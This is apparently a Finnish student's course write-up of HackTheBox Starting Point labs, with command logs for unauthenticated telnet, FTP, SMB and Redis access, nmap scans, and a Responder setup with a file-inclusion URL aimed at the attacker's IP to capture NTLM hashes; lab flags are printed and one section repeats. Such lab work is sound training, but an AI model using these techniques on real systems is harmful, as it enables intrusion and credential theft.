## h5 Kohti omaa treeniä

Tehtävät ovat Tero Karvisen opintojaksolta [Tunkeutumistestaus](https://terokarvinen.com/tunkeutumistestaus/) [^1]

---

#### Laite jolla tehtävät tehdään:

- Apple MacBook Pro M2 Max
- macOS Sequoia 15.3.2
- Parallels Desktop

---

## x) Lue/katso ja tiivistä.

- Karvinen 2025: Start Your Research with a Review Article [^15]

    - Review artikkeli, joka tarkastelee ja kokoaa akateemisesta kirjallisuudesta jotain aihetta.
    - artikkelin JUFO level tulisi olla 1, 2 tai 3. 
    - Scholar.google.com on hyvä paikka etsiä Review artikkeleita. 

- Review. Etsi vapaavalintainen review eli katsausartikkeli, joka liittyy kurssin aiheisiin.

    - Artikkelin piti olla JUFO:ssa mutta en osannut ilmeisesti käyttää sitä, koska en löytänyt sopivaa artikkelia. 
    - Valitsin kuitenkin ADVANCEMENTS IN AUTHENTICATION MECHANISMS USING OAUTH 2.0
      AND SAML - https://www.researchgate.net/profile/Kumaresan-Durvas-Jayaraman/publication/390172665_ADVANCEMENTS_IN_AUTHENTICATION_MECHANISMS_USING_OAUTH_20_AND_SAML/links/67e324bb72f7f37c3e8d9210/ADVANCEMENTS-IN-AUTHENTICATION-MECHANISMS-USING-OAUTH-20-AND-SAML.pdf [^16]
    - Tiivistelmä: 
    
        - OAuth 2.0 autentikointi kehys, jonka avulla kolmannen osapuolen sovellukset voivat  saada käyttöönsä käyttäjän tietoja sovelluksesta ilman, että käyttäjän salasanaa jaetaan.
        - OAuth 2.0 on erittäin laajasti käytetty autentikointi tapa.
        - OAuth 2.0 käytetään SSO (Single Sing On) toteutuksissa.
        - Proof Key for Code Exchange (PKCE) käyttö on lisätty estämään hyökkääjän yritystä saada authorization code.


## a) HTB Dancing. Ratkaise HackTheBox.com: Starting Point: Tier 0: Dancing. [4]

#### Huom! Katsoin tehtävänannon väärin ja tein Tier 0:sta kaikki ilmaiset. Tässä on ensimmäisenä tuo tehtävänanannon Dancing ja jos et halua spoilereita muista tehtävistä, niin hyppää b tehtävään.

#### Tier 0 Dancing

Server Message Block (SMB) [^6]

Jonkin verran piti yrittää, että pääsin shelliin. Käytin apuna tätä Stac Overflow keskustelua [^7].

```bash
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ smbclient //10.129.207.84/WorkShares
Password for [WORKGROUP\parallels]:
Try "help" to get a list of possible commands.
smb: \> cd Amy.J\
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 12:08:24 2021
  ..                                  D        0  Mon Mar 29 12:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 13:00:37 2021

                5114111 blocks of size 4096. 1752535 blocks available
smb: \Amy.J\> get worknotes.txt 
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \Amy.J\> cd ..
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 11:38:03 2021
  ..                                  D        0  Thu Jun  3 11:38:03 2021
  flag.txt                            A       32  Mon Mar 29 12:26:57 2021

                5114111 blocks of size 4096. 1753921 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.2 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \James.P\> 
```


---

## Mahdolliset sploilerit alkaa kohta

<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>




Katsoin Hack the Boxin YouTube-kanavalta videon [^2] miten yhdistää openvpn:llä virtuaalikone Hack the Boxin tehtäviin. 

Latasin .ovpn filen ja ajoin `sudo openvpn ladattu.ovpn`. Videolla käytettiin sudoa, mutta kokeilin ilman ja ei toiminut. Videon mukaan terminaali ylläpitää vpn yhteyttä ja se tulee jättää taustalle päälle.  


#### Tier 0 Meow

Seuraavaski klikkasin Spawn the Machine ja kun kone oli valmis testasin yhteyden:

```bash
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ ping 10.129.218.41
PING 10.129.218.41 (10.129.218.41) 56(84) bytes of data.
64 bytes from 10.129.218.41: icmp_seq=1 ttl=63 time=33.8 ms
64 bytes from 10.129.218.41: icmp_seq=2 ttl=63 time=36.2 ms
64 bytes from 10.129.218.41: icmp_seq=3 ttl=63 time=36.4 ms
64 bytes from 10.129.218.41: icmp_seq=4 ttl=63 time=36.2 ms
^C
--- 10.129.218.41 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 33.811/35.659/36.371/1.068 ms
```

Tehtävät 1 - 7 olivat yksinkertaisia lämmittely tehtäviä. 

Tehtävään 8 tuli selvä vinkki tehtävässä 7, jotein katsoin miten telnettiin kirjaudutaan. Tämän [^3] mukaan vain `telnet ip-osoite` ja se toimi (root tuli vinkkinä aiemmasta tehtävästä):

```bash
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ telnet 10.129.218.41      
Trying 10.129.218.41...
Connected to 10.129.218.41.
Escape character is '^]'.
root

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 06 May 2025 09:41:33 PM UTC

  System load:           0.08
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             136
  Users logged in:       0
  IPv4 address for eth0: 10.129.218.41
  IPv6 address for eth0: dead:beef::250:56ff:fe94:157c

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# 
```

```bash
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
```

#### Tier 0 Fawn

FTP = file tranfer protocol ja käyttää defaulttina porttia 21 [^5]. SFTP on saltumpi protokolla [^5]

Jälleen tehtävä johdatteli hyvin suoraa 

```bash
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ ftp 10.129.238.56                                                                     
Connected to 10.129.238.56.
220 (vsFTPd 3.0.3)
Name (10.129.238.56:parallels): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||50332|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||17144|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |*************************************************************|    32      440.14 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.87 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||28226|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp>
```

Hiukan aikaa mietin, että mihin se meni, mutta lataus tuli suoraan kotihakemistoon.

```bash
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ cat flag.txt    
035db21c881520061c53e0536e44f815    
```

#### Tier 0 Dancing

Server Message Block (SMB) [^6]

Jonkin verran piti yrittää, että pääsin shelliin. Käytin apuna tätä Stac Overflow keskustelua [^7]. 

```bash
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ smbclient //10.129.207.84/WorkShares
Password for [WORKGROUP\parallels]:
Try "help" to get a list of possible commands.
smb: \> cd Amy.J\
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 12:08:24 2021
  ..                                  D        0  Mon Mar 29 12:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 13:00:37 2021

                5114111 blocks of size 4096. 1752535 blocks available
smb: \Amy.J\> get worknotes.txt 
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \Amy.J\> cd ..
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 11:38:03 2021
  ..                                  D        0  Thu Jun  3 11:38:03 2021
  flag.txt                            A       32  Mon Mar 29 12:26:57 2021

                5114111 blocks of size 4096. 1753921 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.2 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \James.P\> 
```

#### Tier 0 Rendeemer

Nyt piti käyttää laajempaa nmap skannausta [^8]

```
nmap -p0- -v -A -T4 10.129.64.60 
```

Aiemmin olin siis käyttänyt:

```
nmap -T4 -A 10.129.64.60
```

Kirjautumiseen redis-cli käytin [^9]

```
redis-cli -h 10.129.64.60 -p 6379
```

Käytin tässäkin rediksen dokumentaatiota [^9]

```bash
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ redis-cli -h 10.129.64.60 -p 6379
10.129.64.60:6379> keys *
1) "numb"
2) "flag"
3) "temp"
4) "stor"
10.129.64.60:6379> keys "flag"
1) "flag"
10.129.64.60:6379> get "flag"
"03e1d2b376c37ab3f5319922053953eb"
```

---

<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

## Sploilerit loppuu

---

### b) HTB Responder. Ratkaise HackTheBox.com: Starting Point: Tier 1: Responder.

En osannut vastata ensimmäiseen kysymykseen, koska en tajunnut että koneen ip-osoite pitäisi laittaa selaimeen 😃 Mielestäni kysymys oli jotenkin järjetön ja ajattelin vaan, että en vain tajua itse kysymystä, niin Googlasin kysymyksen ja luin vastauksen täältä [^10].

Language tehtätävän kohdalla (olin arvannut php:n, mutta hiukan siinä jo ihmettelin) menin hiukan hämilleni ja aloin miettiä, että nyt en tajua jotain ja katoin varovasti taas aiempaa artikkelia [^10]. Ykköstehtävässä laitettiin koneen url /etc/hosts/ ja tämähän aiheutti sen, että itse sivulle tuli pääsy. Nyt tehtävässä on huomattavasti enemmän järkeä. 

NT (New Technology) LAN Manager (NTLM) [^11]

Pääsin Responder vaiheeseen selailemalla googlea ja tuurilla kokeilemalla kaikkea.

```bash
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.15.181]
    Responder IPv6             [dead:beef:2::11b3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-OVN1W9AXNAE]
    Responder Domain Name      [YQCN.LOCAL]
    Responder DCE-RPC Port     [48556]

[+] Listening for events...     
```

Jos ymmärrän oikein niin tämän [^12] ja tämän artikkelin [^13] mukaan jotain olisi jo pitänyt taphtua kun kokeilen osoitteita page=/osoite/somefile, mutta mitään ei tapahtunut. 

Katsoin walktroughin [^14] ja olen ehkä tehnyt jotain väärin, mutta kun menen mielestäni oikeaan urliin selaimessa: http://unika.htb/index.php?page=//10.10.15.181/somefile, niin Responderissa ei tapahdu mitään 🤔. 



---

### Lähteet

[^1]: Tero Karvinen. Tunkeutumistestaus: https://terokarvinen.com/tunkeutumistestaus/

[^2]: Hack the Box. Hack The Box FAQs: HOW TO CONNECT TO VPN: https://www.youtube.com/watch?v=LMCKbR_wWds

[^3]: Using telnet: https://support.ricoh.com/bb_v1oi/pub_e/oi_view/0001038/0001038625/view/network/unv/0029.htm

[^4]: Hack the Box: Learn the basics of Penetration Testing - Starting point: https://app.hackthebox.com/starting-point 

[^5]: Wikipedia. FTP: https://en.wikipedia.org/wiki/FTP

[^6]: Wikipedia. Server Message Block: https://en.wikipedia.org/wiki/Server_Message_Block

[^7]: Stack Overflow. SMB Client Commands Through Shell Script: https://stackoverflow.com/questions/28698694/smb-client-commands-through-shell-script

[^8]: nmap.org. A Quick Port Scanning Tutorial: https://nmap.org/book/port-scanning-tutorial.html

[^9]: Redis. Getting Started: https://redis.io/learn/howtos/quick-start 

[^10]: Carla Ferreira. Hack The Box — Starting Point “Responder” Solution: https://medium.com/rakulee/hack-the-box-starting-point-responder-solution-d0fa2ea77a56

[^11]: Wikipedia. NTLM https://en.wikipedia.org/wiki/NTLM

[^12]: 0xdf hacks stuff. Getting Creds via NTLMv2: https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html

[^13]: narrowtomato. Using Responder To Grab NetNTLMv2: https://narrowtomato.github.io/guides/responder_ntlm.html

[^14]: GetCyber. Responder – Hack The Box // Walkthrough & Solution // Kali Linux: https://www.youtube.com/watch?v=wq-najIgsRU

[^15]: Tero Karvinen. Start Your Research with a Review Article: https://terokarvinen.com/review-article/

[^16]: Kumaresan Durvas Jayaraman, Dr. Shubha Goel. ADVANCEMENTS IN AUTHENTICATION MECHANISMS USING OAUTH 2.0 AND SAML: https://www.researchgate.net/profile/Kumaresan-Durvas-Jayaraman/publication/390172665_ADVANCEMENTS_IN_AUTHENTICATION_MECHANISMS_USING_OAUTH_20_AND_SAML/links/67e324bb72f7f37c3e8d9210/ADVANCEMENTS-IN-AUTHENTICATION-MECHANISMS-USING-OAUTH-20-AND-SAML.pdf
